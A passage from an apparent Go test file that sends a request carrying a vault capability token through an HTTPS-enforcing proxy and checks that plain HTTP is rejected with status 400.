	reqHTTP.Header.Set(vault.HeaderCapability, tok.Token.Reveal())
	httpsProxy.ServeHTTP(recHTTP, reqHTTP)
	if recHTTP.Code != http.StatusBadRequest {
		t.Fatalf("RequireHTTPS status=%d, want 400", recHTTP.Code)
	}
}
